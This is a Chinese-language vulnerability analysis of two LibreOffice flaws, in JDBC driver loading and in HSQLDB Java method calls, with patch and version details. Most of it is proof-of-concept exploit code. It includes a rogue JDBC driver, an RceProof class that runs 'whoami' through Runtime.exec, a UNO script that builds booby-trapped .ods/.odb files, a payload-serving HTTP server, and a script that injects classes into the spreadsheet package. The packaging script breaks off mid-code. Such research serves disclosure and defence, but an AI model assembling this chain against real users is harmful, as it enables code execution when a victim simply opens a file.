LibreOffice JDBC 驱动加载与 HSQLDB 任意代码执行漏洞分析：CVE-2026-104007 与 CVE-2026-104692

CVE-2026-104007与CVE-2026-104692 LibreOffice JDBC驱动加载与HSQLDB任意代码执行漏洞分析

AI 导读

本文分析 LibreOffice 的 CVE-2026-104007 与 CVE-2026-104692 两处缺陷：前者因 JDBC 驱动加载位置取自数据库文档本身，打开文档即可加载并运行文档提供的 Java 代码；后者因捆绑的 HSQLDB 在通用 JDBC 驱动下不限制可调用方法，SQL 可调用任意 Java 方法执行代码。

值得关注

从源码层面拆解了两条漏洞的触发路径与修复差异，并给出可复现的 PoC 文档生成流程，便于判断自用环境是否受影响。

正文

一、漏洞说明

通告在 https://www.libreoffice.org/security/ 。

LibreOffice 可以通过用 Java 编写的 JDBC 驱动程序连接到数据库。电子表格可以使用数据库作为数据透视表的数据源，而描述连接的数据库文档会指定要使用的驱动程序。

驱动程序的加载位置取自数据库文档本身，因此精心构造的文档可以让 LibreOffice 加载并运行文档打开时提供的 Java 代码。这与 CVE-2026-63277 修复的问题途径不同。

在固定版本中，驱动程序位置仅取自用户的驱动程序配置，并且源是由 URL 命名的数据库文档的透视表仅在用户允许更新链接后才会连接

CVE-2026-104692

LibreOffice 捆绑了 HSQLDB 数据库引擎，该引擎既可以通过通用的 JDBC 数据库驱动程序使用，也可以通过对嵌入式数据库的支持来使用。HSQLDB 允许 SQL 语句调用 Java 方法，但仅限于允许的类。

当通过通用 JDBC 驱动程序使用 HSQLDB 时，此限制不适用，因此精心构造的文档中的 SQL 可以调用任何 Java 方法并运行代码。

在固定版本中，无论通过何种方式访问数据库，SQL 都只能调用 HSQLDB 的内置函数。

三、受影响版本

厂商公告的修复版本是 26.2.7 和 26.8.2。范围是 26.2 低于 26.2.7，以及 26.8 低于 26.8.2

四、影响组件

受影响的是 LibreOffice 自带的 Base 数据库接入和 Calc 表单。表单把 form:apply-design-mode 设成 false 时，会在打开表格的过程中连接数据源。这个动作走的是表单，不走宏，宏安全对话框不会弹出来。数据源是远程 odb 时，下载和连接在同一次打开里。

五、利用条件

类路径要进 URLClassLoader，表格得用 form:datasource 指向那份 odb，odb 的 db:java-classpath 得指向实际放了 .class 的文件。这次生成文档时路径是已知的，写的就是这张 ods 的 file: 地址。odb 被过滤器导入之后，这份属性在 setPropertyInfo() 里写进数据源。26.2.6 在这里把文档路径合并进去，26.2.7 在这里删掉。

要走 CALL，驱动类得是 HSQLDB，并且 form:escape-processing="false"，语句才能到 supportsJavaMethod()。只靠 connect() 时，驱动类写成文档里的那个 class 就够了，白名单插不进来。

Marker.java

package lab;

import java.io.File;
import java.io.FileOutputStream;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Properties;
import java.util.logging.Logger;

/** PoC JDBC driver: marker only, no shell, writes confined to C:\lo-lab\markers */
public class Marker implements Driver {
    public static final String PREFIX = "jdbc:lab:";
    public static final String MARKER_DIR = "C:\\lo-lab\\markers";

    static {
        try { java.sql.DriverManager.registerDriver(new Marker()); } catch (Throwable t) {}
    }

    public Connection connect(String url, Properties info) throws SQLException {
        if (url != null && url.startsWith(PREFIX)) {
            write(url.substring(PREFIX.length()));
        }
        return null; // 不提供真实连接：标记写出即达成本轮目的
    }

    public boolean acceptsURL(String url) { return url != null && url.startsWith(PREFIX); }
    public DriverPropertyInfo[] getPropertyInfo(String u, Properties p) { return new DriverPropertyInfo[0]; }
    public int getMajorVersion() { return 1; }
    public int getMinorVersion() { return 0; }
    public boolean jdbcCompliant() { return false; }
    public Logger getParentLogger() throws SQLFeatureNotSupportedException { throw new SQLFeatureNotSupportedException(); }

    /** HSQLDB CALL 轮入口: CALL "lab.Marker.mark"('<path>') */
    public static void mark(String path) { write(path); }

    static void write(String path) {
        try {
            File f = new File(path).getCanonicalFile();
            File dir = new File(MARKER_DIR).getCanonicalFile();
            String p = f.getPath(), d = dir.getPath();
            if (!p.startsWith(d + File.separatorChar)) return;  // 只允许 markers 目录内
            try (FileOutputStream o = new FileOutputStream(f)) {
                o.write("marker\n".getBytes("UTF-8"));          // 7 字节，与原实验一致
            }
        } catch (Throwable t) { /* 静默：不改变宿主行为 */ }
    }
}

Probe.java

import java.lang.reflect.Field;
import java.lang.reflect.Method;

/** 对照两版 hsqldb.jar：accessibleJavaMethodNames 与 supportsJavaMethod() 的行为 */
public class Probe {
    public static void main(String[] args) throws Exception {
        Class<?> c = Class.forName("org.hsqldb.persist.HsqlDatabaseProperties");
        Method m = c.getMethod("supportsJavaMethod", String.class);
        Field f = c.getDeclaredField("accessibleJavaMethodNames");
        f.setAccessible(true);
        System.out.println("accessibleJavaMethodNames=" + f.get(null));
        Object r = m.invoke(null, args[0]);
        System.out.println("supportsJavaMethod(" + args[0] + ")=" + r);
    }
}

RceProof.java

package lab;

import java.io.File;
import java.io.FileOutputStream;
import java.net.InetAddress;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.Properties;
import java.util.logging.Logger;

/** RCE 一锤定音轮：connect() 触发 Runtime.exec 跑 whoami，输出限定在 markers 目录。
    证据文件两段：cmd 原生输出（> 重定向）+ Java 侧追加行 —— 同一文件同时证明
    “操作系统命令被执行”与“Java 代码在 LO 的 JVM 里运行”。 */
public class RceProof implements Driver {
    public static final String PREFIX = "jdbc:lab:";

    public Connection connect(String url, Properties info) throws SQLException {
        if (url != null && url.startsWith(PREFIX)) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{
                    "cmd", "/c", "whoami>C:\\lo-lab\\markers\\rce-proof.txt"});
                p.waitFor();
                try (FileOutputStream o = new FileOutputStream(
                        new File("C:\\lo-lab\\markers\\rce-proof.txt"), true)) {
                    o.write(String.format(
                        "--- appended from Java: user=%s host=%s jvm=%s%n",
                        System.getProperty("user.name"),
                        InetAddress.getLocalHost().getHostName(),
                        System.getProperty("java.vm.name")).getBytes("UTF-8"));
                }
            } catch (Throwable t) { /* silent */ }
        }
        return null;
    }

    public boolean acceptsURL(String url) { return url != null && url.startsWith(PREFIX); }
    public DriverPropertyInfo[] getPropertyInfo(String u, Properties p) { return new DriverPropertyInfo[0]; }
    public int getMajorVersion() { return 1; }
    public int getMinorVersion() { return 0; }
    public boolean jdbcCompliant() { return false; }
    public Logger getParentLogger() throws SQLFeatureNotSupportedException { throw new SQLFeatureNotSupportedException(); }
}

make_docs.py

# -*- coding: utf-8 -*-
"""Author PoC documents natively via LibreOffice UNO (run with LO's bundled python).

Connects to headless soffice on 127.0.0.1:2002 (started by make_all.cmd).
Creates per (tag, mode):
  payload/poc-<tag>-<mode>.ods  form with URL datasource -> payload/odb-<tag>-<mode>.odb
  payload/odb-<tag>-<mode>.odb  created via DataSource API (or kept if hand-built loads)
Usage: python.exe make_docs.py            # author ods for all 4 combos
       python.exe make_docs.py loadtest   # only try loading hand-built odb
"""
import sys, uno
from com.sun.star.beans import PropertyValue

DSBASE = "http://127.0.0.1:18751"
PDIR = "C:/lo-lab/payload"
MODE = sys.argv[1] if len(sys.argv) > 1 else "author"

def pv(name, value):
    p = PropertyValue(); p.Name = name; p.Value = value; return p

def connect(retries=30, delay=2):
    import time
    ctxLocal = uno.getComponentContext()
    resolver = ctxLocal.ServiceManager.createInstanceWithContext(
        "com.sun.star.bridge.UnoUrlResolver", ctxLocal)
    last = None
    for _ in range(retries):
        try:
            return resolver.resolve(
                "uno:socket,host=127.0.0.1,port=2002;urp;StarOffice.ComponentContext")
        except Exception as e:
            last = e
            time.sleep(delay)
    raise last

ctx = connect()
smgr = ctx.ServiceManager
desktop = smgr.createInstanceWithContext("com.sun.star.frame.Desktop", ctx)

def loadtest_odb():
    try:
        doc = desktop.loadComponentFromURL(
            "file:///" + PDIR + "/odb-2626-connect.odb", "_blank", 0,
            (pv("Hidden", True), pv("ReadOnly", True)))
        print("HANDMADE_ODB_LOAD=OK")
        try:
            doc.dispose()
        except Exception:
            pass
        return True
    except Exception as e:
        print("HANDMADE_ODB_LOAD=FAIL", repr(e)[:200])
        return False

def make_odb(tag, mode):
    """Create fresh odb via DataSource API and storeAsURL."""
    marker = f"C:/lo-lab/markers/marker-{tag}-{mode}.txt"
    if mode == "connect":
        url, drv = "jdbc:lab:" + marker, "lab.Marker"
    else:
        url, drv = "jdbc:hsqldb:mem:lab", "org.hsqldb.jdbcDriver"
    classpath = f"file:///{PDIR}/poc-{tag}-{mode}.ods"
    ds = smgr.createInstanceWithContext("com.sun.star.sdb.DataSource", ctx)
    ds.URL = url
    ds.Info = uno.Any("[]com.sun.star.beans.PropertyValue", (
        pv("JavaDriverClass", drv),
        pv("JavaDriverClassPath", classpath),
        pv("ParameterNameSubstitution", False),
    ))
    doc = ds.DatabaseDocument
    out = f"file:///{PDIR}/odb-{tag}-{mode}.odb"
    doc.storeAsURL(out, ())
    doc.close()
    print("ODB_STORED", out)

def make_ods(tag, mode):
    marker = f"C:/lo-lab/markers/marker-{tag}-{mode}.txt"
    doc = desktop.loadComponentFromURL(
        "private:factory/scalc", "_blank", 0, (pv("Hidden", True),))
    sheet = doc.Sheets.getByIndex(0)
    dp = sheet.DrawPage
    forms = dp.Forms
    form = doc.createInstance("com.sun.star.form.component.Form")
    form.Name = "poc"
    form.DataSourceName = f"{DSBASE}/odb-{tag}-{mode}.odb"
    if mode in ("connect", "rce"):
        form.CommandType = 0          # TABLE
        form.Command = "T"
        form.EscapeProcessing = True
    else:
        form.CommandType = 2          # COMMAND (raw SQL)
        form.Command = f"CALL \"lab.Marker.mark\"('{marker}')"
        form.EscapeProcessing = False
    lb = doc.createInstance("com.sun.star.form.component.ListBox")
    lb.Name = "lb1"
    form.insertByName("lb1", lb)
    forms.insertByName("poc", form)
    shape = doc.createInstance("com.sun.star.drawing.ControlShape")
    from com.sun.star.awt import Point, Size
    shape.Position = Point(1000, 1000)
    shape.Size = Size(8000, 1000)
    shape.setControl(lb)
    dp.add(shape)
    out = f"file:///{PDIR}/poc-{tag}-{mode}.ods"
    doc.storeAsURL(out, (pv("FilterName", "calc8"),))
    doc.close(False)
    print("ODS_STORED", out)

if MODE == "loadtest":
    loadtest_odb()
else:
    handmade_ok = loadtest_odb()
    for tag in ("2626", "2627"):
        for m in ("connect", "call", "rce"):
            if not handmade_ok:
                make_odb(tag, m)
            make_ods(tag, m)

# -*- coding: utf-8 -*-
"""Serve payload dir on 127.0.0.1:18751 (replacement for the original http.server)."""
import http.server, socketserver, os, sys, datetime

ROOT = r"C:\lo-lab\payload"
PORT = 18751

class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        line = "%s [%s] %s" % (datetime.datetime.now().strftime("%H:%M:%S"), self.address_string(), fmt % args)
        print(line, flush=True)
        with open(r"C:\lo-lab\http.log", "a", encoding="utf-8") as f:
            f.write(line + "\n")
    def do_OPTIONS(self):  # LO may probe; original lab also returned 501 here
        self.send_error(501, "Unsupported method")

    def __init__(self, *a, **kw):
        os.chdir(ROOT)
        super().__init__(*a, **kw)

socketserver.ThreadingTCPServer.allow_reuse_address = False  # Windows 下 True 会造成重复绑定
with socketserver.ThreadingTCPServer(("127.0.0.1", PORT), H) as httpd:
    print(f"serving {ROOT} on 127.0.0.1:{PORT}", flush=True)
    httpd.serve_forever()

1.3. 打包成表格压缩包

# -*- coding: utf-8 -*-
"""Inject lab/*.class into every poc-*.ods AND declare them in META-INF/manifest.xml
(LO rejects package entries that are not listed in the manifest)."""
import glob, os, zipfile

CLASSES = {}
for f in glob.glob(r"C:\lo-lab\lab\classes\lab\*.class"):
    CLASSES["lab/" + os.path.basename(f)] = open(f, "rb").read()
ENTRIES = "".join(
    '<manifest:file-entry manifest:full-path="%s" manifest:media-type="application/octet-stream"/>' % name
    for name in CLASSES)

for src in glob.glob(r"C:\lo-lab\payload\poc-*.ods"):
    tmp = src + ".new"
    with zipfile.ZipFile(src) as oz, zipfile.ZipFile(tmp, "w") as nz:
        for info in oz.infolist():
            if info.filename in CLASSES:   # 幂等：旧的 lab/*.class 条目跳过，统一重写
                continue
            data = oz.read(info.filename)
            if info.filename == "META-INF/manifest.xml":
                text = data.decode("utf-8")

升到 26.2.7 或 26.8.2。类路径在 setPropertyInfo() 里删，名单在 HSQLDB 的静态字段里改，两处都在这两个版本里。26.8.2 上的三个提交和 26.2.7 不是同一个 SHA，基本信息表里按分支列开了。
